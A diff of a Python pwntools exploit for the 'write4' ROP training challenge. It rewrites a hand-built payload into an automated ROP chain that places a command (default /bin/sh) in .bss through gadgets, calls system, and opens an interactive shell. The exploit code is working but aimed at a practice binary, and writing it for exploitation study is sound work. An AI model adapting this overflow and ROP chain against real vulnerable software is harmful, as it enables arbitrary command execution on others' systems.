@@ -1,31 +1,31 @@
 import pwn
+import sys
 
 # Setup enviroment
 process = pwn.process("./write4")
 pwn.context(os="linux", arch="amd64")
 elf = pwn.ELF("write4")
 
-data_section = elf.bss()
-system_arg = "cat flag.txt"
+# Get cmd and pad
+cmd = "/bin/sh" if len(sys.argv) == 1 else sys.argv[1]
+cmd = cmd + 8 * "\x00" if len(cmd) % 8 == 0 else cmd + (8-(len(cmd)%8)) * "\x00"
 
-def write_to_location(inp, loc):
-    inp = inp + 8 * "\x00" if len(inp) % 8 == 0 else  inp + (8-(len(inp)%8)) * "\x00"
-    return  "".join([pwn.p64(0x0000000000400890) + \
-                     pwn.p64(loc+i) + inp[i:i+8] + \
-                     pwn.p64(elf.symbols["usefulGadgets"]) 
-                     for i in range(0, len(inp), 8)])
+# Generate rop
+rop = pwn.ROP(elf)
+for i in range(0, len(cmd), 8):
+    rop.raw(rop.find_gadget(["pop r14", "pop r15", "ret"]))
+    rop.raw(elf.bss()+i)
+    rop.raw(cmd[i:i+8])
+    pwn.log.info("Found gadget mov? " + str(rop.find_gadget(["mov r14, r15"])))
+    rop.raw(elf.symbols["usefulGadgets"]) # mov r14, r15
+rop.system(elf.bss())
+pwn.log.info(rop.dump())
 
+# Execute command
 process.readline()
 process.readline()
 process.readline()
 process.readline()
-
-payload = "A" * 40
-payload += write_to_location(system_arg, data_section)
-payload += pwn.p64(0x0000000000400893) # pop rdi; ret;
-payload += pwn.p64(data_section) 
-payload += pwn.p64(elf.symbols["system"])
-print payload
-
+payload = "A" * 40 + rop.chain()
 process.sendline(payload)
-print process.readline()[2:]
+process.interactive()
